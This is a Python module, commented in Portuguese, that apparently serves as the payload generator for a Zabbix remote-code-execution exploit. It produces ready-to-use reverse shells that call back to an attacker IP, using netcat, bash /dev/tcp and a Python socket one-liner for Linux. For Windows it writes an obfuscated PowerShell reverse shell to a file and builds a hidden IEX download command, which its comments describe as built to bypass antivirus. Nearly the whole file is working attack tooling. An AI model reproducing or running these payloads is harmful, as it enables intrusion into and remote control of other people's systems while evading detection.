"""
Módulo gerador de payloads para o Zabbix RCE Exploit
Gera payloads para diferentes sistemas operacionais e métodos
"""

import os
import uuid
from pathlib import Path
from typing import Dict, Optional


class PayloadGenerator:
    """Gerador de payloads para exploits"""
    
    def __init__(self, payloads_dir="payloads"):
        self.payloads_dir = Path(payloads_dir)
        self.payloads_dir.mkdir(exist_ok=True)
        
        # Métodos disponíveis por sistema operacional
        self.linux_methods = ['netcat', 'bash', 'python']
        self.windows_methods = ['powershell']
    
    def generate_linux_payload(self, method: str, ip_shell: str, port: int) -> Dict[str, str]:
        """Gera payload para sistemas Linux"""
        if method not in self.linux_methods:
            raise ValueError(f"Método '{method}' não suportado para Linux. Use: {self.linux_methods}")
        
        payloads = {
            'netcat': f"nc -e /bin/bash {ip_shell} {port}",
            'bash': f"bash -i >& /dev/tcp/{ip_shell}/{port} 0>&1",
            'python': f"python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip_shell}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])\""
        }
        
        payload = payloads[method]
        
        return {
            'command': payload,
            'method': method,
            'os_type': 'linux',
            'description': f"Linux reverse shell usando {method}"
        }
    
    def generate_windows_payload(self, method: str, ip_shell: str, port: int) -> Dict[str, str]:
        """Gera payload para sistemas Windows"""
        if method not in self.windows_methods:
            raise ValueError(f"Método '{method}' não suportado para Windows. Use: {self.windows_methods}")
        
        if method == 'powershell':
            return self._generate_powershell_payload(ip_shell, port)
        else:
            raise ValueError(f"Método '{method}' não implementado")
    
    def _generate_powershell_payload(self, ip_shell: str, port: int) -> Dict[str, str]:
        """Gera payload PowerShell ofuscado com download alternativo"""
        import base64
        
        # Codifica o IP em base64 para ofuscação
        ip_bytes = ip_shell.encode('utf-8')
        ip_base64 = base64.b64encode(ip_bytes).decode('utf-8')
        
        # Gera nome único para o arquivo
        filename = f"ps1_{uuid.uuid4().hex[:8]}.ps1"
        filepath = self.payloads_dir / filename
        
        # Payload PowerShell ofuscado que será baixado
        ps_payload = f"""
try {{
$CQFMsfKxtrsgNcx = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{ip_base64}"))
$rsovi_ybpst_hxo = {port}
$CcDDVMiOPwURX = New-Object System.Net.Sockets.TCPClient($CQFMsfKxtrsgNcx, $rsovi_ybpst_hxo)
$qwyemjh = $CcDDVMiOPwURX.GetStream()
$nbr_dcckk = New-Object System.IO.StreamWriter($qwyemjh)
$tGoWPjSDY = New-Object System.IO.StreamReader($qwyemjh)
$csbnsi = "Conexão estabelecida de $env:COMPUTERNAME ($env:USERNAME)"
$nbr_dcckk.WriteLine($csbnsi)
$nbr_dcckk.Flush()
while ($CcDDVMiOPwURX.Connected) {{
$nbr_dcckk.Write("SHELL> ")
$nbr_dcckk.Flush()
$ezswz_uckssq_lsxede = ""
while ($qwyemjh.DataAvailable -or $ezswz_uckssq_lsxede -eq "") {{
if (-not $qwyemjh.DataAvailable) {{
Start-Sleep -Milliseconds 100
continue
}}
$ezswz_uckssq_lsxede = $tGoWPjSDY.ReadLine()
if ($ezswz_uckssq_lsxede -eq "exit") {{
$CcDDVMiOPwURX.Close()
return
}}
$MhwOtwaGGgQxnq = ""
try {{
$MhwOtwaGGgQxnq = Invoke-Expression $ezswz_uckssq_lsxede 2>&1 | Out-String
}} catch {{
$MhwOtwaGGgQxnq = "[ERRO] " + $_.Exception.Message
}}
$nbr_dcckk.WriteLine($MhwOtwaGGgQxnq)
$nbr_dcckk.Flush()
}}
}}
}} catch {{
}} finally {{
if ($nbr_dcckk) {{ $nbr_dcckk.Close() }}
if ($tGoWPjSDY) {{ $tGoWPjSDY.Close() }}
if ($qwyemjh) {{ $qwyemjh.Close() }}
if ($CcDDVMiOPwURX) {{ $CcDDVMiOPwURX.Close() }}
}}
"""
        
        # Salva arquivo PowerShell
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(ps_payload.strip())
        
        # Método alternativo de download mais compacto para bypass de antivírus
        # Usando Invoke-RestMethod que é menos detectado
        download_command = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX(Invoke-RestMethod http://{ip_shell}:8000/{filename})\""
        
        return {
            'command': download_command,
            'method': 'powershell',
            'os_type': 'windows',
            'description': 'Windows PowerShell ofuscado via HTTP (bypass antivírus)',
            'payload_file': str(filepath),
            'http_url': f"http://{ip_shell}:8000/{filename}"
        }
    
    def get_available_methods(self, os_type: str) -> list:
        """Retorna métodos disponíveis para um sistema operacional"""
        if os_type.lower() == 'linux':
            return self.linux_methods.copy()
        elif os_type.lower() == 'windows':
            return self.windows_methods.copy()
        else:
            return []
    
    def get_method_description(self, os_type: str, method: str) -> str:
        """Retorna descrição de um método específico"""
        descriptions = {
            'linux': {
                'netcat': 'Netcat tradicional com -e (mais confiável)',
                'bash': 'Redirecionamento TCP nativo do Bash',
                'python': 'Socket Python (requer Python instalado)'
            },
            'windows': {
                'powershell': 'PowerShell ofuscado via HTTP (bypass antivírus + variáveis aleatórias)'
            }
        }
        
        return descriptions.get(os_type.lower(), {}).get(method, 'Descrição não disponível')
    
    def cleanup_payloads(self):
        """Remove arquivos de payload gerados"""
        if self.payloads_dir.exists():
            for file in self.payloads_dir.glob("ps1_*.ps1"):
                try:
                    file.unlink()
                    print(f"Removido: {file.name}")
                except Exception as e:
                    print(f"Erro ao remover {file.name}: {e}")
    
    def list_generated_payloads(self) -> list:
        """Lista arquivos de payload gerados"""
        if not self.payloads_dir.exists():
            return []
        
        return [f.name for f in self.payloads_dir.glob("ps1_*.ps1")]